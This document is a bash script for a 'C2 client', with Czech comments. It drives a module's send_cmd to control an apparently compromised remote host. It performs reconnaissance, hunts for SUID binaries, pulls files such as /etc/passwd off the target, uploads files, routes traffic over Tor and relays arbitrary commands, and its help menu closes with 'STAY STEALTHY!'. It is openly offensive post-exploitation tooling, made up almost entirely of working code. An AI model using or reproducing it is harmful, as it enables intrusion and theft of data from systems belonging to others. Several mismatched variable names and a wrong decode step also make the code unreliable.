#!/usr/bin/env bash
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

show_help() {

  echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${BLUE}║                   C2 CLIENT HELP MENU                       ║${NC}"
  echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
  echo -e ""
  echo -e "${GREEN}📖 USAGE:${NC}"
  echo -e "  $0 <module> <url>"
  echo -e ""
  echo -e "${GREEN}🚀 AVAILABLE COMMANDS:${NC}"
  echo -e ""
  echo -e "${YELLOW}🔍 SYSTEM COMMANDS:${NC}"
  echo -e "  ${GREEN}explore${NC}          - Perform system reconnaissance"
  echo -e "  ${GREEN}search <pattern> [dir]${NC} - Find files matching pattern"
  echo -e "  ${GREEN}suid${NC}             - Find SUID binaries"
  echo -e ""
  echo -e "${YELLOW}📁 FILE OPERATIONS:${NC}"
  echo -e "  ${GREEN}upload <local> <remote> [threads]${NC}   - Upload file to target"
  echo -e "  ${GREEN}download <remote> <local> [threads]${NC} - Download file from target"
  echo -e "  ${GREEN}emergency_upload <local> <remote>  ${NC} - Upload non-binary file to target"
  echo -e "  ${GREEN}get_chunk - prints chunk size"
  echo -e "  ${GREEN}set_chunk <size> - sets chunk size"
  echo -e ""
  echo -e "${YELLOW}🌐 NETWORK COMMANDS:${NC}"
  echo -e "  ${GREEN}netstats${NC}          - Show network statistics"
  echo -e ""
  echo -e "${YELLOW}🛡️ PRIVACY COMMANDS:${NC}"
  echo -e "  ${GREEN}tor${NC}              - Enable Tor proxy (socks5://127.0.0.1:9050)"
  echo -e "  ${GREEN}notor${NC}            - Disable Tor proxy"
  echo -e ""
  echo -e "${YELLOW}⚙️ LOCAL COMMANDS:${NC}"
  echo -e "  ${GREEN}local <command>${NC}  - Execute command on local machine"
  echo -e "  ${GREEN}help${NC}             - Show this help message"
  echo -e "  ${GREEN}exit${NC}             - Exit the client"
  echo -e ""
  echo -e "${YELLOW}🎯 EXAMPLES:${NC}"
  echo -e "  ${CYAN}upload /local/file.txt /remote/file.txt${NC}"
  echo -e "  ${CYAN}download /etc/passwd ./password_file${NC}"
  echo -e "  ${CYAN}emergency_upload /local/file.txt /remote/file.txt${NC}"
  echo -e "  ${CYAN}search *.conf /etc${NC}"
  echo -e "  ${CYAN}local pwd${NC}"
  echo -e "  ${CYAN}explore${NC}"
  echo -e ""
  echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${BLUE}║                 END OF HELP - STAY STEALTHY!                ║${NC}"
  echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
}

# Check for help argument
if [[ "$#" -eq 0 || "$1" == "--help" || "$1" == "-h" ]]; then
  show_help
  exit 0
fi

# Check for version
if [[ "$1" == "--version" || "$1" == "-v" ]]; then
  echo "C2 Client v1.0"
  exit 0
fi

CHUNK_SIZE=512
PROGRESS_WIDTH=25

get_chunk_size() {
  echo "$CHUNK_SIZE"
}

set_chunk_size() {
  CHUNK_SIZE="$1"
}

# Načtení modulu
MODULE_NAME="${1:-sample_module}"
MODULE_PATH="./modules/${MODULE_NAME}.sh"

if [[ ! -f "$MODULE_PATH" ]]; then
  echo "[!] Module $MODULE_NAME not found"
  exit 1
fi

# source modulu
source "$MODULE_PATH"

# Ověření, že modul má povinné funkce
for fn in module_init module_main send_cmd module_description show_module_help; do
  if ! declare -f "$fn" >/dev/null; then
    echo "[!] Module $MODULE_NAME is missing function $fn"
    exit 1
  fi
done

# Inicializace modulu s parametry z CLI
shift # odstraní jméno modulu

# Check for help argument
if [[ "$#" -eq 0 || "$1" == "--help" || "$1" == "-h" ]]; then
  show_module_help
  exit 0
fi

module_init "$@"

# Zobrazení krátkého popisu
echo "Loaded module: $MODULE_NAME"
module_description

# ------------------------------
# Functions
# ------------------------------

local_cmd() { eval "$*"; }

# upload file line by line using echo >> remote_file
emergency_upload() {
  local local_file="$1"
  local remote_file="$2"

  if [ -z "$local_file" ] || [ -z "$remote_file" ]; then
    echo "Usage: emergency_upload <local_file> <remote_file>"
    return 1
  fi
  # clear remote file first
  send_cmd "echo -n '' > $remote_file"
  local lineno=0
  while IFS= read -r line; do
    lineno=$((lineno + 1))
    # escape quotes to avoid breaking echo
    safe_line=$(printf "%s" "$line" | sed "s/'/'\"'\"'/g")
    send_cmd "echo '$safe_line' >> $remote_file"
    echo "[*] Sent line $lineno"
  done <"$local_file"

  echo "[*] Upload complete -> $remote_file"
}

# remote_check_b64helper(): vrací název helperu který funguje: base64|openssl|php|python3|python|perl|ruby|none
remote_check_b64helper() {
  # prefer builtins
  if send_cmd "command -v base64 >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "base64"
    return
  fi
  if send_cmd "command -v openssl >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "openssl"
    return
  fi
  for cmd in php python3 python perl ruby; do
    if send_cmd "command -v $cmd >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
      echo "$cmd"
      return
    fi
  done
  if send_cmd "command -v xxd >/dev/null 2>&1 && command -v od >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "xxd_od"
    return
  fi
  echo "none"
}

draw_progress() {
  local CURRENT="$1" TOTAL="$2"
  local PERCENT=$((CURRENT * 100 / TOTAL))
  local FILLED=$((CURRENT * PROGRESS_WIDTH / TOTAL))
  local EMPTY=$((PROGRESS_WIDTH - FILLED))
  BAR=$(printf "%0.s#" $(seq 1 $FILLED))$(printf "%0.s." $(seq 1 $EMPTY))
  printf "\r[%s] %3d%% (%d/%d)" "$BAR" "$PERCENT" "$CURRENT" "$TOTAL"
}

parallel_upload() {
  local LOCAL_FILE="$1" REMOTE_OUT="$2"
  local THREADS=${3:-8}
  local REMOTE_B64="upload.b64"
  local PART_PREFIX="part_"

  [[ ! -f "$LOCAL_FILE" ]] && {
    echo -e "${RED}[!]${NC} Local file not found"
    return 1
  }

  # Příprava base64
  B64TMP="$(mktemp)"
  "$LOCAL_B64_ENCODE_CMD" "$LOCAL_FILE" | tr -d '\n' >"$B64TMP"

  FILE_SIZE=$(stat -c%s "$B64TMP")
  echo -e "${GREEN}[*]${NC} Base64 file prepared: $FILE_SIZE bytes"

  # Rozdělení na části podle BYTŮ, ne řádků
  TOTAL_CHUNKS=$(((FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE))
  echo -e "${GREEN}[*]${NC} Splitting into $TOTAL_CHUNKS chunks with $THREADS threads..."

  # Vytvořit části podle velikosti (bytes), ne počtu řádků
  split -b "${CHUNK_SIZE}" -d "$B64TMP" "${PART_PREFIX}"

  # Počet skutečně vytvořených částí
  ACTUAL_CHUNKS=$(ls ${PART_PREFIX}* 2>/dev/null | wc -l)
  if [[ $ACTUAL_CHUNKS -eq 0 ]]; then
    echo -e "${RED}[!]${NC} No chunks created - file might be too small"
    rm -f "$B64TMP"
    return 1
  fi

  # Funkce pro upload části
  upload_chunk() {
    local chunk_file="$1"
    local chunk_num=$(echo "$chunk_file" | grep -o '[0-9][0-9]*$')
    local chunk_content=$(<"$chunk_file")

    # Escape speciálních znaků
    local escaped_content=$(printf '%s' "$chunk_content" | sed "s/'/'\\\\''/g")

    local cmd=$(printf "printf '%%s' '%s' >> %s.parts" "$escaped_content" "$REMOTE_B64")
    if send_cmd "$cmd" >/dev/null; then
      echo -e "${GREEN}[+]${NC} Chunk $chunk_num uploaded"
      return 0
    else
      echo -e "${RED}[!]${NC} Failed to upload chunk $chunk_num"
      return 1
    fi
  }

  # Inicializovat soubor na remote
  send_cmd "> ${REMOTE_B64}.parts"

  # Paralelní upload
  CURRENT=0
  for chunk in ${PART_PREFIX}*; do
    upload_chunk "$chunk" &
    CURRENT=$((CURRENT + 1))
    draw_progress "$CURRENT" "$ACTUAL_CHUNKS"

    # Omezení počtu paralelních procesů
    if ((CURRENT % THREADS == 0)); then
      wait
    fi
  done
  wait
  echo

  # Složení souboru na cílovém systému
  echo -e "${GREEN}[*]${NC} Assembling file on remote system..."
  send_cmd "$B64_DECODE_CMD ${REMOTE_B64}.parts > '$REMOTE_OUT' && rm ${REMOTE_B64}.parts"

  # Ověření
  # Ověření
  local remote_size=$(send_cmd "ls -l '$REMOTE_OUT' | awk '{print \$5}'")
  local local_size=$(stat -c%s "$LOCAL_FILE")

  if [[ "$remote_size" -eq "$local_size" ]]; then
    echo -e "${GREEN}[+]${NC} Upload verified: $remote_size bytes"
  else
    echo -e "${RED}[!]${NC} Size mismatch: local=$local_size, remote=$remote_size"
  fi
  # Ověření pomocí MD5
  echo -e "${GREEN}[*]${NC} Verifying integrity with md5sum..."
  local remote_md5=$(send_cmd "md5sum '$REMOTE_FILE' | awk '{print \$1}'")
  local local_md5=$(md5sum "$LOCAL_OUT" | awk '{print $1}')

  if [[ "$remote_md5" == "$local_md5" ]]; then
    echo -e "${GREEN}[✓]${NC} MD5 hash match ($local_md5)"
  else
    echo -e "${RED}[✗]${NC} MD5 mismatch! Remote: $remote_md5  Local: $local_md5"
  fi

  # Úklid
  rm -f ${PART_PREFIX}* "$B64TMP"
  echo -e "${GREEN}[+]${NC} Parallel upload finished: $REMOTE_OUT"
}
parallel_download() {
  local REMOTE_FILE="$1" LOCAL_OUT="$2"
  local THREADS=${3:-8}
  local TMP_DIR="$(mktemp -d)"
  local PART_PREFIX="${TMP_DIR}/part_"

  # Získat velikost souboru
  # Získat velikost souboru
  echo -e "${GREEN}[*]${NC} Getting file size..."
  FILE_SIZE=$(send_cmd "ls -l '$REMOTE_FILE' | awk '{print \$5}'")
  #FILE_SIZE=$(echo "$FILE_SIZE" | tr -cd '0-9')

  TOTAL_CHUNKS=$(((FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE))
  echo -e "${GREEN}[*]${NC} Downloading $FILE_SIZE bytes in $TOTAL_CHUNKS chunks ($THREADS threads)"

  # Funkce pro stažení jednoho chunku (jako base64 text, bez newline)
  download_chunk() {
    local chunk_num="$1"
    local offset=$((chunk_num * CHUNK_SIZE))
    local count=$((chunk_num < TOTAL_CHUNKS - 1 ? CHUNK_SIZE : FILE_SIZE - offset))
    local output_file="${PART_PREFIX}${chunk_num}.b64"

    CMD="dd if='$REMOTE_FILE' bs=1 skip=$offset count=$count 2>/dev/null | $B64_ENCODE_CMD"
    RESPONSE=$(send_cmd "$CMD")

    if [[ -n "$RESPONSE" ]]; then
      echo -n "$RESPONSE" >"$output_file"
      echo -e "${GREEN}[+]${NC} Chunk $chunk_num OK ($count bytes)"
      return 0
    else
      echo -e "${RED}[!]${NC} Empty response for chunk $chunk_num"
      return 1
    fi
  }

  # Paralelní stahování
  CURRENT=0
  for ((chunk_num = 0; chunk_num < TOTAL_CHUNKS; chunk_num++)); do
    download_chunk "$chunk_num" &
    CURRENT=$((CURRENT + 1))
    draw_progress "$CURRENT" "$TOTAL_CHUNKS"

    if ((CURRENT % THREADS == 0)) || ((chunk_num == TOTAL_CHUNKS - 1)); then
      wait
    fi
  done
  echo

  # Složení base64 do správného pořadí
  echo -e "${GREEN}[*]${NC} Assembling base64 data..."
  for ((i = 0; i < TOTAL_CHUNKS; i++)); do
    cat "${PART_PREFIX}${i}.b64" >>"${TMP_DIR}/full.b64"
  done

  # Dekódování do výsledného souboru
  LOCAL_B64_ENCODE_CMD "${TMP_DIR}/full.b64" >"$LOCAL_OUT"

  # Ověření velikosti
  # Ověření velikosti
  local final_size=$(stat -c%s "$LOCAL_OUT" 2>/dev/null || wc -c <"$LOCAL_OUT")
  if [[ "$final_size" -eq "$FILE_SIZE" ]]; then
    echo -e "${GREEN}[+]${NC} Size verified: $final_size/$FILE_SIZE bytes"
  else
    echo -e "${RED}[!]${NC} Size mismatch: $final_size/$FILE_SIZE bytes"
  fi

  # Ověření pomocí MD5
  echo -e "${GREEN}[*]${NC} Verifying integrity with md5sum..."
  local remote_md5=$(send_cmd "md5sum '$REMOTE_FILE' | awk '{print \$1}'")
  local local_md5=$(md5sum "$LOCAL_OUT" | awk '{print $1}')

  if [[ "$remote_md5" == "$local_md5" ]]; then
    echo -e "${GREEN}[✓]${NC} MD5 hash match ($local_md5)"
  else
    echo -e "${RED}[✗]${NC} MD5 mismatch! Remote: $remote_md5  Local: $local_md5"
  fi

  # Úklid
  rm -rf "$TMP_DIR"
  echo -e "${GREEN}[+]${NC} Parallel download finished: $LOCAL_OUT"
}

explore() {
  echo -e "${GREEN}[*] ${YELLOW}System reconnaissance${NC}:"
  send_cmd "uname -a"
  echo -ne "${BLUE}"
  send_cmd "cat /etc/issue"
  echo -ne "${NC}"
  send_cmd "id"
  echo -ne "${BLUE}"
  send_cmd "mount"
  echo -ne "${NC}"
}

enable_tor() {
  export ALL_PROXY="socks5://127.0.0.1:9050"
  echo -e "${GREEN}[*] ${YELLOW}Tor proxy enabled"
}

disable_tor() {
  unset ALL_PROXY
  echo -e "${GREEN}[*] ${YELLOW}Tor proxy disabled"
}

find_files() {
  local PATTERN="$1"
  local DIR="${2:-/}"
  echo -e "${GREEN}[*] ${YELLOW}Finding files: $PATTERN in $DIR${NC}"
  send_cmd "find $DIR -name '$PATTERN' -type f 2>/dev/null"
}

find_suid() {
  echo -e "${GREEN}[*] ${YELLOW}Finding suid binaries${NC}"
  send_cmd "find / -perm /4000 2>/dev/null"
}

network_stats() {
  echo -e "${GREEN}[*]${YELLOW} Network Statistics and Connections:${NC}"
  echo -e "${BLUE}════════════════════════════════════════════${NC}"

  # Rozhraní a IP adresy
  echo -e "${GREEN}[+]${YELLOW} Network Interfaces:${NC}"
  send_cmd "ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo 'No network tools available'"
  echo

  # Aktivní spojení
  echo -e "${GREEN}[+]${YELLOW} Active Connections:${NC}"
  send_cmd "netstat -tunap 2>/dev/null || ss -tunap 2>/dev/null || lsof -i 2>/dev/null | head -20"
  echo

  # Routing table
  echo -e "${GREEN}[+]${YELLOW} Routing Table:${NC}"
  send_cmd "ip route show 2>/dev/null || route -n 2>/dev/null || echo 'No routing tools available'"
  echo

  # DNS konfigurace
  echo -e "${GREEN}[+]${YELLOW} DNS Configuration:${NC}"
  send_cmd "cat /etc/resolv.conf 2>/dev/null | grep -v '^#' | grep -v '^$' || echo 'No DNS config found'"
  echo

  # Síťové služby
  echo -e "${GREEN}[+]${YELLOW} Listening Services:${NC}"
  send_cmd "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || lsof -i -sTCP:LISTEN 2>/dev/null | head -15"
  echo

  # Firewall status
  echo -e "${GREEN}[+]${YELLOW} Firewall Status:${NC}"
  send_cmd "iptables -L -n 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --state 2>/dev/null || echo 'No firewall detected'"
  echo

  # Síťová throughput statistika
  echo -e "${GREEN}[+]${YELLOW} Network Throughput:${NC}"
  send_cmd "cat /proc/net/dev 2>/dev/null | head -5 | tail -2"
  echo
}

# ------------------------------
# Main loop
# ------------------------------
HELPER="none"
B64_INTERPRETER=$(remote_check_b64helper)
case "$B64_INTERPRETER" in
  base64) {
    BASE64_ENCODE_CMD="base64 -w0"
    BASE64_DECODE_CMD="base64 -d"
    HELPER=""
  } ;;
  openssl) {
    BASE64_ENCODE_CMD="./b64helper.sh encode"
    BASE64_DECODE_CMD="./b64helper.sh decode"
    HELPER="b64helper.sh"
  } ;;
  xxd_od) {
    BASE64_ENCODE_CMD="./b64helper2.sh encode"
    BASE64_DECODE_CMD="./b64helper2.sh decode"
    HELPER="b64helper2.sh"
  } ;;
  php) {
    BASE64_ENCODE_CMD="php ./b64helper.php encode"
    BASE64_DECODE_CMD="php ./b64helper.php decode"
    HELPER="b64helper.php"
  } ;;
  python3) {
    BASE64_ENCODE_CMD="python3 ./b64helper.py encode"
    BASE64_DECODE_CMD="python3 ./b64helper.py decode"
    HELPER="b64helper.py"
  } ;;
  python) {
    BASE64_ENCODE_CMD="python ./b64helper.py encode"
    BASE64_DECODE_CMD="python ./b64helper.py decode"
    HELPER="b64helper.py"
  } ;;
  perl) {
    BASE64_ENCODE_CMD="perl ./b64helper.pl encode"
    BASE64_DECODE_CMD="perl ./b64helper.pl decode"
    HELPER="b64helper.pl"
  } ;;
  ruby) {
    BASE64_ENCODE_CMD="ruby ./b64helper.rb encode"
    BASE64_DECODE_CMD="ruby ./b64helper.rb decode"
    HELPER="b64helper.rb"
  } ;;
  none)
    echo "Base64 dezection error"
    exit 1
    ;;
esac

if [[ "$HELPER" == "xxd_od" ]]; then
  LOCAL_B64_DECODE_CMD="$BASE64_DECODE_CMD"
  LOCAL_B64_ENCODE_CMD="$BASE64_ENCODE_CMD"
else
  LOCAL_B64_DECODE_CMD="base64 -d"
  LOCAL_B64_ENCODE_CMD="base64"
fi

if [[ -z "$HELPER" ]]; then
  echo -e "${GREEN}[+] ${NC} Found base64 on remote system no helper is needed..."
else
  echo -e "${GREEN}[+] ${NC} Found $B64_INTERPRETER uploading $HELPER by emergency upload...."
  emergency_upload "./helpers/$HELPER" "$HELPER"
  send_cmd "chmod +x $HELPER"
fi

user=$(send_cmd "whoami")
if [[ -z "$user" ]]; then
  echo -e "${RED}[!] ${NC}Cannot connect to $URL"
  exit 1
fi
echo -e "${GREEN}[*] ${NC}Connected to: ${BLUE}$URL ${NC}as ${BLUE}$user"
echo -e "${NC}Welcome to $(send_cmd 'uname -a')"
echo -e "$(send_cmd 'cat /etc/issue')"
echo -e "    ${YELLOW}Type <command>"
echo -e "         upload <local> <remote> [threads]"
echo -e "         download <remote> <local> [threads]"
echo -e "         local <command>"
echo -e "         explore - show system stats"
echo -e "         search <dir> <pattern>"
echo -e "         suid - show suid binaries"
echo -e "         tor - enable tor"
echo -e "         notor - disable tor"
echo -e "         netstats - show network stats"
echo -e "         emergency_upload <local> <remote>"
echo -e "         get_chunk - print chunk size"
echo -e "         set_chunk <size>"
echo -e "         helpme - displays help"
echo -e "         or exit"
while true; do
  echo -ne "${BLUE}"
  read -rp "$user> " LINE
  echo -ne "${NC}"
  [[ "$LINE" == "exit" ]] && break
  set -- $LINE
  module_main
  case "$1" in
    local)
      shift
      local_cmd "$*"
      ;;
    upload)
      shift
      parallel_upload "$1" "$2" "${3:-8}"
      ;;
    download)
      shift
      parallel_download "$1" "$2" "${3:-8}"
      ;;
    explore) explore ;;
    tor) enable_tor ;;
    notor) disable_tor ;;
    search)
      shift
      find_files "$1" "$2"
      ;;
    suid) find_suid ;;
    netstats) network_stats ;;
    emergency_upload)
      shift
      emergency_upload "$1" "$2"
      ;;
    helpme) show_help ;;
    get_chunk) get_chunk_size ;;
    set_chunk)
      shift
      set_chunk_size "$1"
      ;;
    *) send_cmd "$*" ;;
  esac
done
